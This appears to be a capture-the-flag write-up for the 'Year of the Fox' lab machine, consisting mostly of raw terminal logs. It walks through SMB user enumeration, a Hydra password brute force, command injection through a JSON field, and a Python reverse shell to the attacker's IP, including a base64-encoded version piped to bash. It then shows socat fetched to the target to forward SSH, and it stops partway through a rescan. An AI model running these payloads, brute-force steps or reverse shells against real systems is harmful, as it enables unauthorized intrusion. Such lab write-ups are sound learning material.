----
Don't underestimate the sly old fox...
---

![](https://i.imgur.com/JOBQtGF.png)

### Hack the machine and obtain the flags

 Start Machine

![222](https://tryhackme-images.s3.amazonaws.com/room-icons/8faf2455af3daf7d2e0ee7b7af97f4d7.jpeg)  

Can you get past the wily fox?

Answer the questions below

```
┌──(witty㉿kali)-[~/bug_hunter/Endpoints/screenshots]
└─$ rustscan -a 10.10.249.21 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.249.21:80
Open 10.10.249.21:139
Open 10.10.249.21:445
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-25 18:20 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:20
Completed NSE at 18:20, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:20
Completed NSE at 18:20, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:20
Completed NSE at 18:20, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 18:20
Completed Parallel DNS resolution of 1 host. at 18:20, 0.02s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 18:20
Scanning 10.10.249.21 [3 ports]
Discovered open port 80/tcp on 10.10.249.21
Discovered open port 445/tcp on 10.10.249.21
Discovered open port 139/tcp on 10.10.249.21
Completed Connect Scan at 18:20, 0.19s elapsed (3 total ports)
Initiating Service scan at 18:20
Scanning 3 services on 10.10.249.21
Completed Service scan at 18:20, 11.65s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.249.21.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:20
Completed NSE at 18:20, 6.01s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:20
Completed NSE at 18:20, 0.78s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:20
Completed NSE at 18:20, 0.00s elapsed
Nmap scan report for 10.10.249.21
Host is up, received user-set (0.19s latency).
Scanned at 2023-03-25 18:20:36 EDT for 19s

PORT    STATE SERVICE     REASON  VERSION
80/tcp  open  http        syn-ack Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=You want in? Gotta guess the password!
|_http-title: 401 Unauthorized
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: YEAROFTHEFOX)
445/tcp open  netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: YEAROFTHEFOX)
Service Info: Hosts: year-of-the-fox.lan, YEAR-OF-THE-FOX

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: year-of-the-fox
|   NetBIOS computer name: YEAR-OF-THE-FOX\x00
|   Domain name: lan
|   FQDN: year-of-the-fox.lan
|_  System time: 2023-03-25T22:20:49+00:00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 3140/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 45749/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 29474/udp): CLEAN (Failed to receive data)
|   Check 4 (port 25502/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| nbstat: NetBIOS name: YEAR-OF-THE-FOX, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| Names:
|   YEAR-OF-THE-FOX<00>  Flags: <unique><active>
|   YEAR-OF-THE-FOX<03>  Flags: <unique><active>
|   YEAR-OF-THE-FOX<20>  Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   YEAROFTHEFOX<00>     Flags: <group><active>
|   YEAROFTHEFOX<1d>     Flags: <unique><active>
|   YEAROFTHEFOX<1e>     Flags: <group><active>
| Statistics:
|   0000000000000000000000000000000000
|   0000000000000000000000000000000000
|_  0000000000000000000000000000
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-03-25T22:20:49
|_  start_date: N/A

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:20
Completed NSE at 18:20, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:20
Completed NSE at 18:20, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:20
Completed NSE at 18:20, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.91 seconds

┌──(witty㉿kali)-[~/bug_hunter/SQLiDetector]
└─$ smbclient -N -L 10.10.249.21

	Sharename       Type      Comment
	---------       ----      -------
	yotf            Disk      Fox's Stuff -- keep out!
	IPC$            IPC       IPC Service (year-of-the-fox server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	YEAROFTHEFOX         YEAR-OF-THE-FOX

┌──(witty㉿kali)-[~/bug_hunter/SQLiDetector]
└─$ smbmap -u anonymous -H 10.10.249.21
[+] Guest session   	IP: 10.10.249.21:445	Name: 10.10.249.21                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	yotf                                              	NO ACCESS	Fox's Stuff -- keep out!
	IPC$                                              	NO ACCESS	IPC Service (year-of-the-fox server (Samba, Ubuntu))

┌──(witty㉿kali)-[~/bug_hunter/SQLiDetector]
└─$ rpcclient -U "" 10.10.249.21
Password for [WORKGROUP\]:
rpcclient $> enumdomains
name:[YEAR-OF-THE-FOX] idx:[0x0]
name:[Builtin] idx:[0x1]
rpcclient $> enumdomusers
user:[fox] rid:[0x3e8]
rpcclient $> quit

──(witty㉿kali)-[~/bug_hunter/SQLiDetector]
└─$ sudo crackmapexec smb 10.10.249.21 -u 'guest' -p '' --rid-brute
SMB         10.10.249.21    445    YEAR-OF-THE-FOX  [*] Windows 6.1 (name:YEAR-OF-THE-FOX) (domain:lan) (signing:False) (SMBv1:True)
SMB         10.10.249.21    445    YEAR-OF-THE-FOX  [+] lan\guest: 
SMB         10.10.249.21    445    YEAR-OF-THE-FOX  [+] Brute forcing RIDs
Traceback (most recent call last):
  File "/usr/bin/crackmapexec", line 8, in <module>
    sys.exit(main())

uhmm not work

┌──(witty㉿kali)-[~/bug_hunter/Endpoints/screenshots]
└─$ rustscan -a 10.10.249.21 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.249.21:80
Open 10.10.249.21:139
Open 10.10.249.21:445
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-25 18:20 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:20
Completed NSE at 18:20, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:20
Completed NSE at 18:20, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:20
Completed NSE at 18:20, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 18:20
Completed Parallel DNS resolution of 1 host. at 18:20, 0.02s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 18:20
Scanning 10.10.249.21 [3 ports]
Discovered open port 80/tcp on 10.10.249.21
Discovered open port 445/tcp on 10.10.249.21
Discovered open port 139/tcp on 10.10.249.21
Completed Connect Scan at 18:20, 0.19s elapsed (3 total ports)
Initiating Service scan at 18:20
Scanning 3 services on 10.10.249.21
Completed Service scan at 18:20, 11.65s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.249.21.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:20
Completed NSE at 18:20, 6.01s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:20
Completed NSE at 18:20, 0.78s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:20
Completed NSE at 18:20, 0.00s elapsed
Nmap scan report for 10.10.249.21
Host is up, received user-set (0.19s latency).
Scanned at 2023-03-25 18:20:36 EDT for 19s

PORT    STATE SERVICE     REASON  VERSION
80/tcp  open  http        syn-ack Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=You want in? Gotta guess the password!
|_http-title: 401 Unauthorized
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: YEAROFTHEFOX)
445/tcp open  netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: YEAROFTHEFOX)
Service Info: Hosts: year-of-the-fox.lan, YEAR-OF-THE-FOX

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: year-of-the-fox
|   NetBIOS computer name: YEAR-OF-THE-FOX\x00
|   Domain name: lan
|   FQDN: year-of-the-fox.lan
|_  System time: 2023-03-25T22:20:49+00:00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 3140/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 45749/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 29474/udp): CLEAN (Failed to receive data)
|   Check 4 (port 25502/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| nbstat: NetBIOS name: YEAR-OF-THE-FOX, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| Names:
|   YEAR-OF-THE-FOX<00>  Flags: <unique><active>
|   YEAR-OF-THE-FOX<03>  Flags: <unique><active>
|   YEAR-OF-THE-FOX<20>  Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   YEAROFTHEFOX<00>     Flags: <group><active>
|   YEAROFTHEFOX<1d>     Flags: <unique><active>
|   YEAROFTHEFOX<1e>     Flags: <group><active>
| Statistics:
|   0000000000000000000000000000000000
|   0000000000000000000000000000000000
|_  0000000000000000000000000000
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-03-25T22:20:49
|_  start_date: N/A

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:20
Completed NSE at 18:20, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:20
Completed NSE at 18:20, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:20
Completed NSE at 18:20, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.91 seconds

                                                                                     
┌──(witty㉿kali)-[~/bug_hunter/Endpoints/screenshots]
└─$ enum4linux -a 10.10.249.21                                        
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Mar 25 18:27:13 2023

 =========================================( Target Information )=========================================

Target ........... 10.10.249.21
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ============================( Enumerating Workgroup/Domain on 10.10.249.21 )============================


[+] Got domain/workgroup name: YEAROFTHEFOX


 ================================( Nbtstat Information for 10.10.249.21 )================================

Looking up status of 10.10.249.21
	YEAR-OF-THE-FOX <00> -         B <ACTIVE>  Workstation Service
	YEAR-OF-THE-FOX <03> -         B <ACTIVE>  Messenger Service
	YEAR-OF-THE-FOX <20> -         B <ACTIVE>  File Server Service
	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
	YEAROFTHEFOX    <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	YEAROFTHEFOX    <1d> -         B <ACTIVE>  Master Browser
	YEAROFTHEFOX    <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

	MAC Address = 00-00-00-00-00-00

 ===================================( Session Check on 10.10.249.21 )===================================


[+] Server 10.10.249.21 allows sessions using username '', password ''


 ================================( Getting domain SID for 10.10.249.21 )================================

Domain Name: YEAROFTHEFOX
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup


 ===================================( OS information on 10.10.249.21 )===================================


[E] Can't get OS info with smbclient


[+] Got OS info for 10.10.249.21 from srvinfo: 
	YEAR-OF-THE-FOXWk Sv PrQ Unx NT SNT year-of-the-fox server (Samba, Ubuntu)
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03


 =======================================( Users on 10.10.249.21 )=======================================

index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: fox	Name: fox	Desc: 

user:[fox] rid:[0x3e8]

 =================================( Share Enumeration on 10.10.249.21 )=================================


	Sharename       Type      Comment
	---------       ----      -------
	yotf            Disk      Fox's Stuff -- keep out!
	IPC$            IPC       IPC Service (year-of-the-fox server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	YEAROFTHEFOX         YEAR-OF-THE-FOX

[+] Attempting to map shares on 10.10.249.21

//10.10.249.21/yotf	Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:

NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
//10.10.249.21/IPC$	Mapping: N/A Listing: N/A Writing: N/A

 ============================( Password Policy Information for 10.10.249.21 )============================



[+] Attaching to 10.10.249.21 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

	[+] YEAR-OF-THE-FOX
	[+] Builtin

[+] Password Info for Domain: YEAR-OF-THE-FOX

	[+] Minimum password length: 5
	[+] Password history length: None
	[+] Maximum password age: 37 days 6 hours 21 minutes 
	[+] Password Complexity Flags: 000000

		[+] Domain Refuse Password Change: 0
		[+] Domain Password Store Cleartext: 0
		[+] Domain Password Lockout Admins: 0
		[+] Domain Password No Clear Change: 0
		[+] Domain Password No Anon Change: 0
		[+] Domain Password Complex: 0

	[+] Minimum password age: None
	[+] Reset Account Lockout Counter: 30 minutes 
	[+] Locked Account Duration: 30 minutes 
	[+] Account Lockout Threshold: None
	[+] Forced Log off Time: 37 days 6 hours 21 minutes 



[+] Retieved partial password policy with rpcclient:


Password Complexity: Disabled
Minimum Password Length: 5


 =======================================( Groups on 10.10.249.21 )=======================================


[+] Getting builtin groups:


[+]  Getting builtin group memberships:


[+]  Getting local groups:


[+]  Getting local group memberships:


[+]  Getting domain groups:


[+]  Getting domain group memberships:


 ==================( Users on 10.10.249.21 via RID cycling (RIDS: 500-550,1000-1050) )==================


[I] Found new SID: 
S-1-22-1

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\fox (Local User)
S-1-22-1-1001 Unix User\rascal (Local User)

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''

S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-5-21-978893743-2663913856-222388731 and logon username '', password ''

S-1-5-21-978893743-2663913856-222388731-501 YEAR-OF-THE-FOX\nobody (Local User)
S-1-5-21-978893743-2663913856-222388731-513 YEAR-OF-THE-FOX\None (Domain Group)
S-1-5-21-978893743-2663913856-222388731-1000 YEAR-OF-THE-FOX\fox (Local User)

 ===============================( Getting printer info for 10.10.249.21 )===============================

No printers returned.


enum4linux complete on Sat Mar 25 18:41:59 2023

This site is asking you to sign in.

GET / HTTP/1.1

Host: 10.10.249.21

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Connection: close

Upgrade-Insecure-Requests: 1



HTTP/1.1 401 Unauthorized

Date: Sat, 25 Mar 2023 23:10:24 GMT

Server: Apache/2.4.29 (Ubuntu)

WWW-Authenticate: Basic realm="You want in? Gotta guess the password!"

Content-Length: 459

Connection: close

Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>401 Unauthorized</title>
</head><body>
<h1>Unauthorized</h1>
<p>This server could not verify that you
are authorized to access the document
requested.  Either you supplied the wrong
credentials (e.g., bad password), or your
browser doesn't understand how to supply
the credentials required.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at 10.10.249.21 Port 80</address>
</body></html>

https://forums.hak5.org/topic/18815-http-head-or-http-get/

┌──(witty㉿kali)-[~/bug_hunter/SQLiDetector]
└─$ hydra -l rascal -P /usr/share/wordlists/rockyou.txt 10.10.249.21 http-head / 

or hydra -l rascal -P /usr/share/wordlists/rockyou.txt 10.10.249.21 http-get -

┌──(witty㉿kali)-[~/bug_hunter/SQLiDetector]
└─$ hydra -l rascal -P /usr/share/wordlists/rockyou.txt 10.10.249.21 http-get -t 64
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-25 19:16:33
[WARNING] You must supply the web page as an additional option or via -m, default path set to /
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking http-get://10.10.249.21:80/
[80][http-get] host: 10.10.249.21   login: rascal   password: iloveyou2
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-25 19:16:57

let's sign in

{"target":"\"||whoami||\""

}
["important-data.txt"]

{"target":"\"$(whoami)\""

}

["Invalid Character"]

{"target":"\";whoami;\""

}
["No file returned"]

blind rce

{"target":"\";ping -c 4 10.8.19.103 ;\""

}

┌──(witty㉿kali)-[~/bug_hunter/SQLiDetector]
└─$ sudo tcpdump -i tun0 -n                                        
[sudo] password for witty: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
19:27:52.253674 IP 10.8.19.103.50908 > 10.10.249.21.80: Flags [S], seq 3220311246, win 64240, options [mss 1460,sackOK,TS val 3382066425 ecr 0,nop,wscale 7], length 0
19:27:52.452323 IP 10.10.249.21.80 > 10.8.19.103.50908: Flags [S.], seq 2912484493, ack 3220311247, win 62643, options [mss 1288,sackOK,TS val 743969307 ecr 3382066425,nop,wscale 6], length 0
19:27:52.452422 IP 10.8.19.103.50908 > 10.10.249.21.80: Flags [.], ack 1, win 502, options [nop,nop,TS val 3382066624 ecr 743969307], length 0
19:27:52.452642 IP 10.8.19.103.50908 > 10.10.249.21.80: Flags [P.], seq 1:452, ack 1, win 502, options [nop,nop,TS val 3382066624 ecr 743969307], length 451: HTTP: POST /assets/php/search.php HTTP/1.1
19:27:52.650243 IP 10.10.249.21.80 > 10.8.19.103.50908: Flags [.], ack 452, win 972, options [nop,nop,TS val 743969498 ecr 3382066624], length 0
19:27:52.650382 IP 10.10.249.21 > 10.8.19.103: ICMP echo request, id 1662, seq 1, length 64
19:27:52.669309 IP 10.8.19.103 > 10.10.249.21: ICMP echo reply, id 1662, seq 1, length 64
19:27:53.650936 IP 10.10.249.21 > 10.8.19.103: ICMP echo request, id 1662, seq 2, length 64
19:27:53.650971 IP 10.8.19.103 > 10.10.249.21: ICMP echo reply, id 1662, seq 2, length 64
19:27:54.652264 IP 10.10.249.21 > 10.8.19.103: ICMP echo request, id 1662, seq 3, length 64
19:27:54.652305 IP 10.8.19.103 > 10.10.249.21: ICMP echo reply, id 1662, seq 3, length 64
19:27:55.653450 IP 10.10.249.21 > 10.8.19.103: ICMP echo request, id 1662, seq 4, length 64
19:27:55.653500 IP 10.8.19.103 > 10.10.249.21: ICMP echo reply, id 1662, seq 4, length 64
19:27:55.847825 IP 10.10.249.21.80 > 10.8.19.103.50908: Flags [P.], seq 1:188, ack 452, win 972, options [nop,nop,TS val 743972700 ecr 3382066624], length 187: HTTP: HTTP/1.1 200 OK
19:27:55.847930 IP 10.8.19.103.50908 > 10.10.249.21.80: Flags [.], ack 188, win 501, options [nop,nop,TS val 3382070019 ecr 743972700], length 0
19:27:55.847989 IP 10.10.249.21.80 > 10.8.19.103.50908: Flags [F.], seq 188, ack 452, win 972, options [nop,nop,TS val 743972701 ecr 3382066624], length 0
19:27:55.849030 IP 10.8.19.103.50908 > 10.10.249.21.80: Flags [F.], seq 452, ack 189, win 501, options [nop,nop,TS val 3382070020 ecr 743972701], length 0
19:27:56.043773 IP 10.10.249.21.80 > 10.8.19.103.50908: Flags [.], ack 453, win 972, options [nop,nop,TS val 743972898 ecr 3382070020], length 0

revshell

{"target":"\";python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.19.103",1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")';\""

}

┌──(witty㉿kali)-[~/bug_hunter/SQLiDetector]
└─$ rlwrap nc -lvnp 1338
listening on [any] 1338 ...

let's encode it

{"target":"\";echo cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuOC4xOS4xMDMiLDEzMzgpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKCIvYmluL2Jhc2giKSc= | base64 -d | bash;\""

}

┌──(witty㉿kali)-[~/bug_hunter/SQLiDetector]
└─$ rlwrap nc -lvnp 1338
listening on [any] 1338 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.249.21] 47020
www-data@year-of-the-fox:/var/www/html/assets/php$ which python
which python
/usr/bin/python
www-data@year-of-the-fox:/var/www/html/assets/php$ python -c 'import pty;pty.spawn("/bin/bash")'
</php$ python -c 'import pty;pty.spawn("/bin/bash")'

www-data@year-of-the-fox:/var/www/html/assets/php$ ls
ls
search.php
www-data@year-of-the-fox:/var/www/html/assets/php$ cd ..
cd ..
www-data@year-of-the-fox:/var/www/html/assets$ ls
ls
css  fonts  images  js	php
www-data@year-of-the-fox:/var/www/html/assets$ cd ..
cd ..
www-data@year-of-the-fox:/var/www/html$ ls
ls
assets	index.html
www-data@year-of-the-fox:/var/www/html$ grep -Ri thm{
grep -Ri thm{
www-data@year-of-the-fox:/var/www/html$ cd ..
cd ..
www-data@year-of-the-fox:/var/www$ grep -Ri thm{
grep -Ri thm{
web-flag.txt:THM{Nzg2ZWQwYWUwN2UwOTU3NDY5ZjVmYTYw}

www-data@year-of-the-fox:/var/www$ netstat -tulpn
netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:22            0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::445                  :::*                    LISTEN      -                   
tcp6       0      0 :::139                  :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 10.10.249.21:68         0.0.0.0:*                           -                   
udp        0      0 10.10.255.255:137       0.0.0.0:*                           -                   
udp        0      0 10.10.249.21:137        0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:137             0.0.0.0:*                           -                   
udp        0      0 10.10.255.255:138       0.0.0.0:*                           -                   
udp        0      0 10.10.249.21:138        0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:138             0.0.0.0:*                           -     

www-data@year-of-the-fox:/var/www$ netstat -tulw | grep ssh
netstat -tulw | grep ssh
tcp        0      0 localhost:ssh           0.0.0.0:*               LISTEN  

port forwarding

┌──(witty㉿kali)-[~/Downloads]
└─$ cp /usr/bin/chisel chisel
                                               
┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.10.249.21 - - [25/Mar/2023 19:47:49] "GET /chisel HTTP/1.1" 200 -

www-data@year-of-the-fox:/var/www$ cd /tmp
cd /tmp
www-data@year-of-the-fox:/tmp$ ls
ls

┌──(witty㉿kali)-[~/Downloads]
└─$ locate socat                
/usr/bin/socat

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.10.249.21 - - [25/Mar/2023 20:32:39] "GET /socat HTTP/1.1" 200 -


www-data@year-of-the-fox:/tmp$ wget http://10.8.19.103:1234/socat
wget http://10.8.19.103:1234/socat
--2023-03-26 00:32:40--  http://10.8.19.103:1234/socat
Connecting to 10.8.19.103:1234... connected.
HTTP request sent, awaiting response... 200 OK
Length: 411624 (402K) [application/octet-stream]
Saving to: 'socat'
www-data@year-of-the-fox:/tmp$ chmod +x socat
chmod +x socat
www-data@year-of-the-fox:/tmp$ ./socat tcp-listen:8888,reuseaddr,fork tcp:localhost:22
<cat tcp-listen:8888,reuseaddr,fork tcp:localhost:22
./socat: error while loading shared libraries: libssl.so.3: cannot open shared object file: No such file or directory

https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat

download it , I was trying with chisel and shuttle but couldn't do it

www-data@year-of-the-fox:/tmp$ rm socat
rm socat
www-data@year-of-the-fox:/tmp$ wget http://10.8.19.103:1234/socat
wget http://10.8.19.103:1234/socat
--2023-03-26 00:50:31--  http://10.8.19.103:1234/socat
Connecting to 10.8.19.103:1234... connected.
HTTP request sent, awaiting response... 200 OK
Length: 375176 (366K) [application/octet-stream]
Saving to: 'socat'

www-data@year-of-the-fox:/tmp$ chmod +x socat
chmod +x socat
www-data@year-of-the-fox:/tmp$ ./socat tcp-listen:8888,reuseaddr,fork tcp:localhost:22
<cat tcp-listen:8888,reuseaddr,fork tcp:localhost:22

┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.249.21 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

